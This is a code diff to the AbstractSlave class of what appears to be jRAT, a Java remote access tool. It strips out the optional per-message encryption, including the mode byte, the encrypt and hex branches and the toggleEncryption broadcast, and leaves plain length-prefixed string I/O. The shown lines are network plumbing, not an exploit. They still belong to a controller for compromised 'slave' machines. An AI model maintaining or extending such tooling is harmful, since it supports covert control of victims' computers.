@@ -19,7 +19,6 @@ import se.jrat.client.io.CountingInputStream;
 import se.jrat.client.io.CountingOutputStream;
 import se.jrat.client.ip2c.Country;
 import se.jrat.client.net.PortListener;
-import se.jrat.client.packets.outgoing.Packet99Encryption;
 import se.jrat.client.settings.CountryStatistics;
 import se.jrat.client.settings.ServerID;
 import se.jrat.client.settings.Settings;
@@ -135,8 +134,6 @@ public abstract class AbstractSlave implements Runnable {
 			Main.debug("Encryption key: " + Hex.encode(key));
 		}
 
-		this.outputStream.write(encryption ? 1 : 0);
-
 		Cipher inCipher = CryptoUtils.getCipher(Cipher.DECRYPT_MODE, secretKey);
 		Cipher outCipher = CryptoUtils.getCipher(Cipher.ENCRYPT_MODE, secretKey);
 		
@@ -149,6 +146,29 @@ public abstract class AbstractSlave implements Runnable {
 
 	public AbstractSlave(String ip) {
 		this.ip = ip;
+	}
+	
+
+	public void writeLine(String s) {
+		try {
+			dos.writeShort(s.length());
+			dos.writeChars(s);
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
+	}
+
+	public String readLine() throws Exception {
+		short len = dis.readShort();
+
+		StringBuilder builder = new StringBuilder();
+		for (int i = 0; i < len; i++) {
+			builder.append(dis.readChar());
+		}
+
+		String s = builder.toString();
+
+		return s;
 	}
 
 	public PortListener getConnection() {
@@ -227,52 +247,6 @@ public abstract class AbstractSlave implements Runnable {
 	public void writeLine(Object obj) {
 		writeLine(obj.toString());
 	}
-
-	public void writeLine(String s) {
-		try {
-			String enc = Crypto.encrypt(s, getKey());
-			byte mode = 0;
-			
-			if (enc.contains("\n")) {
-				mode = 1;
-				enc = Hex.encode(s);
-			} if (!encryption) {
-				mode = 2;
-				enc = s;
-			}
-
-			dos.writeByte(mode);
-			dos.writeShort(enc.length());
-			dos.writeChars(enc);
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
-	}
-
-	public String readLine() throws Exception {
-		byte mode = dis.readByte();
-		short len = dis.readShort();
-
-		StringBuilder builder = new StringBuilder();
-		for (int i = 0; i < len; i++) {
-			builder.append(dis.readChar());
-		}
-
-		String s = builder.toString();
-
-		if (mode == 1) {
-			s = Hex.decode(s);
-		} else if (mode == 0) {
-			try {
-				s = Crypto.decrypt(s, getKey());
-			} catch (Exception e) {
-				e.printStackTrace();
-				s = null;
-			}
-		}
-
-		return s;
-	}
 	
 	public byte[] getKey() {
 		return key;
@@ -281,18 +255,6 @@ public abstract class AbstractSlave implements Runnable {
 
 	public void lock() {
 		lock = !lock;
-	}
-
-	public static final synchronized void toggleEncryption(boolean b) {
-		encryption = b;
-
-		for (AbstractSlave slave : Main.connections) {
-			if (slave instanceof Slave) {
-				((Slave)slave).addToSendQueue(new Packet99Encryption(b));
-			}
-			
-		}
-
 	}
 
 	public boolean isLocked() {
